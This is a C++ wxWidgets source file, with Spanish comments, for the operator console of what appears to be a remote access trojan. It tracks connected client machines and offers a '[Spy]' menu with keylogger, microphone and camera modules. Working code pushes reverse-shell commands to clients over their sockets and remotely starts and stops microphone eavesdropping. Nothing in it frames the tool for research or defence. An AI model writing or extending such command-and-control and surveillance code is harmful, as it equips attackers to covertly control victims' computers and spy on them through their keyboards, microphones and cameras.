#include "frame_client.hpp"
#include "panel_file_manager.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
    EVT_BUTTON(EnumIDS::ID_FrameClienteTest, FrameCliente::OnTest)
    EVT_CLOSE(FrameCliente::OnClose)
    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyListCtrl, wxListCtrl)
    EVT_CONTEXT_MENU(MyListCtrl::OnContextMenu)
    EVT_MENU(EnumIDS::ID_Interactuar, MyListCtrl::OnInteractuar)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
    EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(panelMicrophone, wxPanel)
    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Refresh, panelMicrophone::OnRefrescarDispositivos)
    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Escuchar, panelMicrophone::OnEscuchar)
    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Detener, panelMicrophone::OnDetener)
wxEND_EVENT_TABLE()

FrameCliente::FrameCliente(std::string strID, wxString nameID)
    : wxFrame(nullptr, wxID_ANY, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, nameID)
{
    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo con transparencia
    SetTransparent(245);

    //std::vector<std::string> vcOut = strSplit(strID, '/', 1);
    this->strClienteID = nameID;

    std::unique_lock<std::mutex> lock(vector_mutex);
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == this->strClienteID) {
            iter->_isBusy = true;
            break;
        }
        ++iter;
    }
    lock.unlock();

    
    wxString strTitle = "[";
    strTitle.append(strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);
    
    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(200, 450));
    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));

    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(600, 450));
    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
    
    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,
        wxDefaultPosition, wxSize(200, 450));

    wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
    
    wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
    wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));

    this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
    this->m_tree->AppendItem(rootAdmin, wxT("Administrador de archivos"));

    this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
    
    this->m_tree->AppendItem(rootMisc, wxT("Testing"));

    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxSize(600, 450),
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);

    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
    html->SetBackgroundColour(wxColor(0, 0, 255));
    wxString htmlsource = "<center><h1>Bienvenido a mi morada entre libremente por su propia voluntad</h1></center>";
    html->SetPage(htmlsource);
    html->SetSize(wxSize(200, 200));

    this->m_tree->p_Notebook->Freeze();
    this->m_tree->p_Notebook->AddPage(html, ":v", true);
    this->m_tree->p_Notebook->Thaw();
    
    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);

    sizer->Add(pnl_Left, 0, wxALL, 2);
    sizer->Add(pnl_Right, 1, wxALL, 1);
    

    this->SetSizerAndFit(sizer);

    SetClientSize(800, 450);
    SetSizeHints(820, 485, 820, 485);


}

void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
    int closedPage = event.GetSelection();
    wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
    if (pageTitle == "Reverse Shell") {
        //Enviar comando para cerrar shell al cerra la tab
        std::unique_lock<std::mutex> lock(vector_mutex);

        for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
            if (aClient->_id == this->strClienteID) {
                if (aClient->_isRunningShell) {
                    aClient->_isRunningShell = false;
                    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
                    strComando += "~exit\r\n";
                    p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
                }
                break;
            }
        }
        lock.unlock();
    }
    event.Skip();
}

void FrameCliente::OnTest(wxCommandEvent& event) {
    std::vector<struct Cliente> vc_Copy;
    std::unique_lock<std::mutex> lock(vector_mutex);
    
    vc_Copy = p_Servidor->vc_Clientes;
    lock.unlock();
    
    for (auto aClient : vc_Copy) {
        if (aClient._id == this->strClienteID) {
            int ib = p_Servidor->cSend(aClient._sckCliente, "MIC~0", 13, 0, false);
            std::cout << "SENT " << ib << "\n";
            break;
        }
    }
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    std::unique_lock<std::mutex> lock(vector_mutex);
    
    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
        if (iter->_id == this->strClienteID) {
            iter->_isBusy = false;
            iter->_ttUltimaVez = time(0);
            std::cout << "running shell?: " << iter->_isRunningShell << std::endl;
            if (iter->_isRunningShell) {
                iter->_isRunningShell = false;
                std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
                strComando += "~exit\r\n";
                p_Servidor->cSend(iter->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
            } 
            break;
        }
        ++iter;
    }
    
    lock.unlock();

    event.Skip();
}

//Al hacer doble click en uno de los modulos del panel izquierdo
void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    wxString wStr = GetItemText(itemID);

    bool isFound = false;
    for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
        if (this->p_Notebook->GetPageText(i) == wStr) {
            this->p_Notebook->GetPage(i)->SetFocus();
            isFound = true;
            break;
        }
    }
    //GetPageCount
    if (wStr[0] != '[' && isFound == false) {
        this->p_Notebook->Freeze();

        if (wStr == "Testing") {
            this->p_Notebook->AddPage(new panelTest(this), wStr, true);
        }

        if (wStr == "Reverse Shell") {
            this->p_Notebook->AddPage(new panelReverseShell(this), wStr, true);
        }

        if (wStr == "Administrador de archivos") {
            this->p_Notebook->AddPage(new panelFileManager(this), wStr, true);
        }
        
        if (wStr == "Microfono") {
            this->p_Notebook->AddPage(new panelMicrophone(this), wStr, true);
        }

        this->p_Notebook->Thaw();
    } 
}


//-----------------Modulos-----------------//

//Test
panelTest::panelTest(wxWindow* pParent) :
    wxPanel(pParent, EnumIDS::ID_Panel_Test) {
    wxButton* btn_Test = new wxButton(this, EnumIDS::ID_FrameClienteTest, "EXEC");
    this->lblOutputTest = new wxStaticText(this, EnumIDS::ID_Panel_Label_Test, wxT("Output"), wxPoint(20, 20));
}

//Reverse Shell
panelReverseShell::panelReverseShell(wxWindow* pParent) :
    wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
    wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
    if (wxTree) {
        wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
        if (panel_cliente) {
            FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
            if (frame_cliente) {
                this->strID = frame_cliente->strClienteID;
            }
        }
    }
    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxSize(600-5, 410), wxTE_MULTILINE);
    this->txtConsole->SetForegroundColour(*wxWHITE);
    this->txtConsole->SetBackgroundColour(*wxBLACK);

    Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);

    //Enviar comando al cliente para que ejecute
    std::unique_lock<std::mutex> lock(vector_mutex);

    for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
        if (aClient->_id == this->strID) {
            aClient->_isRunningShell = true;
            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
            strComando += "~0";
            int ib = p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
            break;
        }
    }
    lock.unlock();

}

void panelReverseShell::OnHook(wxKeyEvent& event) {
    //long last_position = this->txtConsole->GetLastPosition();
    long current_pos = this->txtConsole->GetInsertionPoint();
    int iCode = event.GetKeyCode();
    if (iCode == WXK_LEFT || iCode == WXK_BACK) {
        //Si retrocedio hasta el ultimo regresarlo
        if (current_pos <= this->p_uliUltimo) {
            this->txtConsole->SetInsertionPoint(this->p_uliUltimo);
        }else {
            event.Skip();
        }
    }else if (iCode == WXK_UP) {
        //Historial de comandos?
        if (this->vc_History.size() > 0) {
            if (this->iHistorialPos > 0) {
                this->iHistorialPos--;
            }
            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
            wxString strTmp = this->vc_History[this->iHistorialPos];
            this->txtConsole->AppendText(strTmp);
            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
        }
    }else if (iCode == WXK_DOWN) {
        if (this->vc_History.size() > 0) {
            if (this->iHistorialPos + 1 < this->vc_History.size()) {
                this->iHistorialPos++;
            }
            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
            wxString strTmp = this->vc_History[this->iHistorialPos];
            this->txtConsole->AppendText(strTmp);
            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
            
        }
    }else if (iCode == WXK_RETURN) {
        wxString strRandomOut = this->txtConsole->GetLineText(this->txtConsole->GetNumberOfLines()-1);
        int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
        wxString str1 = std::to_string(EnumComandos::Reverse_Shell_Command);
        str1 += "~";
        wxString str2 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
        str1 += str2;
        this->vc_History.push_back(str2);

        str1.append(1, '\r');
        str1.append(1, '\n');
        std::vector<struct Cliente> vc_Copy;
        std::unique_lock<std::mutex> lock(vector_mutex);

        vc_Copy = p_Servidor->vc_Clientes;
        lock.unlock();

        for (auto vcCli : vc_Copy) {
            if (vcCli._id == this->strID) {
                int iEnviado = p_Servidor->cSend(vcCli._sckCliente, str1.c_str(), str1.size()+1, 0, false);
                break;
            }
        }
        
        this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
          
        event.Skip();
    } else {
        if (this->txtConsole->GetInsertionPoint() < this->txtConsole->GetLastPosition()) {
            this->txtConsole->SetInsertionPointEnd();
        }
        event.Skip();
    }
}

//Microfono
panelMicrophone::panelMicrophone(wxWindow* pParent) :
    wxPanel(pParent, EnumIDS::ID_Panel_Microphone) {

    //Otener el ID del cliente directo del padre
    wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
    if (wxTree) {
        wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
        if (panel_cliente) {
            FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
            if (frame_cliente) {
                this->strID = frame_cliente->strClienteID;
            }
        }
    }

    this->SetBackgroundColour(wxColor(200, 200, 200));

    
    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);    
    wxBoxSizer* row_sizer1 = new wxBoxSizer(wxHORIZONTAL);
    wxBoxSizer* row_sizer2 = new wxBoxSizer(wxHORIZONTAL);

    

    this->mic_devices = new wxComboBox(this, EnumIDS::ID_Panel_Mic_CMB_Devices, "...", wxDefaultPosition, wxSize(200, 20));
    wxButton* mic_refresh_devices = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Refresh, "Refrescar lista");
    wxStaticText* lbl1 = new wxStaticText(this, wxID_ANY, "Dispositivos: ");

    row_sizer1->Add(lbl1, 0, wxALL, 1);
    row_sizer1->Add(this->mic_devices, 1, wxALL, 1);
    row_sizer1->Add(mic_refresh_devices, 1, wxALL, 1);

    main_sizer->Add(row_sizer1, 0, wxALL, 1);

    wxButton* mic_start_live = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Escuchar, "Escuchar");
    wxButton* mic_start_rec = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Detener, "Detener");
    
    row_sizer2->Add(mic_start_live, 0, wxALL, 1);
    row_sizer2->Add(mic_start_rec, 0, wxALL, 1);

    main_sizer->Add(row_sizer2, 0, wxALL, 1);

    this->SetSizer(main_sizer);

}

void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
    std::string strComando = std::to_string(EnumComandos::Mic_Refre_Dispositivos);
    strComando.append(1, '~');
    strComando.append(1, '0');
    this->EnviarComando(strComando);
}

void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
    std::string strComando = std::to_string(EnumComandos::Mic_Iniciar_Escucha);
    strComando.append(1, '~');
    
    wxString str_device_id = this->mic_devices->GetStringSelection();
    std::cout << str_device_id << std::endl;
    
    //Quien tiene mas de 10 microfonos :v ?
    strComando.append(1, str_device_id[1]);

    this->EnviarComando(strComando);
}

void panelMicrophone::OnDetener(wxCommandEvent& event) {
    std::string strComando = std::to_string(EnumComandos::Mic_Detener_Escucha);
    strComando.append(1, '~');
    this->EnviarComando(strComando);
}

void panelMicrophone::EnviarComando(std::string pComando) {
    std::vector<struct Cliente> vc_copy;
    std::unique_lock<std::mutex> lock(vector_mutex);
    vc_copy = p_Servidor->vc_Clientes;
    lock.unlock();

    for (auto vcCli : vc_copy) {
        if (vcCli._id == this->strID) {
            int iEnviado = p_Servidor->cSend(vcCli._sckCliente, pComando.c_str(), pComando.size() + 1, 0, false);
            break;
        }
    }
}